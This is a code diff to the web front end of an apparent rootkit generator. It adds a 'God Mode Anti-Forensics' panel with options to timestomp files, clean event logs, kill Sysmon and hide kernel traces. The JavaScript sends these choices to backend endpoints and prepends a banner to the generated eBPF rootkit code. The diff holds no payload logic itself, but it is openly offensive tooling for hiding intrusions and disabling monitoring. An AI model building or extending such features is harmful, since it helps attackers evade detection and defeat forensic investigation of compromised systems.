@@ -267,6 +267,63 @@
                             <i class="fas fa-user-secret me-2"></i>Generate Anti-Forensics
                         </button>
                     </div>
+
+                    <!-- God Mode Anti-Forensics Integration -->
+                    <div class="mb-4 p-3 rounded" style="background: linear-gradient(135deg, rgba(168, 85, 247, 0.1), rgba(239, 68, 68, 0.1)); border: 1px solid rgba(168, 85, 247, 0.3);">
+                        <div class="d-flex justify-content-between align-items-center mb-3">
+                            <label class="form-label text-purple mb-0" style="color: #a855f7;">
+                                <i class="fas fa-skull me-2"></i>God Mode Anti-Forensics
+                            </label>
+                            <div class="form-check form-switch">
+                                <input class="form-check-input" type="checkbox" id="godModeEnabled" style="cursor: pointer;">
+                                <label class="form-check-label text-white" for="godModeEnabled">💀</label>
+                            </div>
+                        </div>
+                        <div id="godModeOptions" style="display: none;">
+                            <div class="row g-2 mb-3">
+                                <div class="col-6">
+                                    <div class="form-check">
+                                        <input class="form-check-input" type="checkbox" id="gmTimestomp" checked>
+                                        <label class="form-check-label text-white" for="gmTimestomp">
+                                            <i class="fas fa-clock me-2 text-warning"></i>Time Stomp
+                                        </label>
+                                    </div>
+                                </div>
+                                <div class="col-6">
+                                    <div class="form-check">
+                                        <input class="form-check-input" type="checkbox" id="gmPhantomClean" checked>
+                                        <label class="form-check-label text-white" for="gmPhantomClean">
+                                            <i class="fas fa-ghost me-2 text-info"></i>Phantom Clean
+                                        </label>
+                                    </div>
+                                </div>
+                                <div class="col-6">
+                                    <div class="form-check">
+                                        <input class="form-check-input" type="checkbox" id="gmSysmonKill">
+                                        <label class="form-check-label text-white" for="gmSysmonKill">
+                                            <i class="fas fa-skull-crossbones me-2 text-danger"></i>Sysmon Kill
+                                        </label>
+                                    </div>
+                                </div>
+                                <div class="col-6">
+                                    <div class="form-check">
+                                        <input class="form-check-input" type="checkbox" id="gmKernelHide" checked>
+                                        <label class="form-check-label text-white" for="gmKernelHide">
+                                            <i class="fas fa-microchip me-2 text-purple"></i>Kernel Traces
+                                        </label>
+                                    </div>
+                                </div>
+                            </div>
+                            <select class="form-select form-select-sm bg-dark text-white border-secondary mb-2" id="gmCleanupProfile">
+                                <option value="persistence">🔐 Persistence Cleanup</option>
+                                <option value="privilege_escalation">⬆️ Privilege Escalation</option>
+                                <option value="full_cleanup" selected>💀 Full Rootkit Cleanup</option>
+                            </select>
+                            <button class="btn btn-sm w-100" style="background: linear-gradient(135deg, #a855f7, #ef4444); border: none;" onclick="executeGodModeCleanup()">
+                                <i class="fas fa-radiation me-2"></i>Execute God Mode Cleanup
+                            </button>
+                        </div>
+                    </div>
                 </div>
             </div>
         </div>
@@ -610,6 +667,90 @@ function downloadCode() {
     a.href = url;
     a.download = 'ebpf_rootkit.c';
     a.click();
+}
+
+// God Mode Functions
+document.getElementById('godModeEnabled')?.addEventListener('change', function() {
+    const options = document.getElementById('godModeOptions');
+    options.style.display = this.checked ? 'block' : 'none';
+});
+
+async function executeGodModeCleanup() {
+    const timestomp = document.getElementById('gmTimestomp').checked;
+    const phantom = document.getElementById('gmPhantomClean').checked;
+    const sysmonKill = document.getElementById('gmSysmonKill').checked;
+    const kernelHide = document.getElementById('gmKernelHide').checked;
+    const profile = document.getElementById('gmCleanupProfile').value;
+
+    const statusDiv = document.createElement('div');
+    statusDiv.className = 'alert alert-info mt-2';
+    statusDiv.innerHTML = '<i class="fas fa-spinner fa-spin me-2"></i>Executing God Mode cleanup...';
+    document.getElementById('godModeOptions').appendChild(statusDiv);
+
+    try {
+        const results = [];
+        
+        // Time Stomp
+        if (timestomp) {
+            const tsResponse = await fetch('/god-mode/api/timestomp/generate', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    target_path: '/var/log/ebpf_loader.log',
+                    reference_file: '/bin/ls',
+                    include_fn: true,
+                    clear_usn: true
+                })
+            });
+            const tsData = await tsResponse.json();
+            results.push({name: 'Time Stomp', success: tsData.success});
+        }
+
+        // Phantom Event Log Cleaner
+        if (phantom) {
+            const phResponse = await fetch('/god-mode/api/phantom/generate', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    cleanup_profile: profile,
+                    use_phantom: true,
+                    kill_sysmon: sysmonKill
+                })
+            });
+            const phData = await phResponse.json();
+            results.push({name: 'Phantom Clean', success: phData.success});
+        }
+
+        // Update status
+        const successCount = results.filter(r => r.success).length;
+        statusDiv.className = successCount > 0 ? 'alert alert-success mt-2' : 'alert alert-danger mt-2';
+        statusDiv.innerHTML = `<i class="fas fa-${successCount > 0 ? 'check' : 'times'} me-2"></i>
+            God Mode: ${successCount}/${results.length} operations ready | Profile: ${profile}
+            ${kernelHide ? '<br><small class="text-warning">⚠️ Kernel traces cleanup enabled</small>' : ''}`;
+        
+        // Add God Mode code to output
+        const gmComment = `
+/*
+ * ============================================
+ * 💀 GOD MODE ANTI-FORENSICS ENABLED
+ * ============================================
+ * Profile: ${profile}
+ * Time Stomp: ${timestomp ? 'ACTIVE' : 'OFF'}
+ * Phantom Clean: ${phantom ? 'ACTIVE' : 'OFF'}
+ * Sysmon Kill: ${sysmonKill ? 'ACTIVE' : 'OFF'}
+ * Kernel Traces: ${kernelHide ? 'HIDDEN' : 'VISIBLE'}
+ * ============================================
+ */
+`;
+        generatedCode = gmComment + generatedCode;
+        document.getElementById('code-output').textContent = generatedCode;
+        
+    } catch (error) {
+        statusDiv.className = 'alert alert-danger mt-2';
+        statusDiv.innerHTML = `<i class="fas fa-exclamation-triangle me-2"></i>Error: ${error.message}`;
+    }
+
+    setTimeout(() => statusDiv.remove(), 5000);
 }
 
 // Initialize
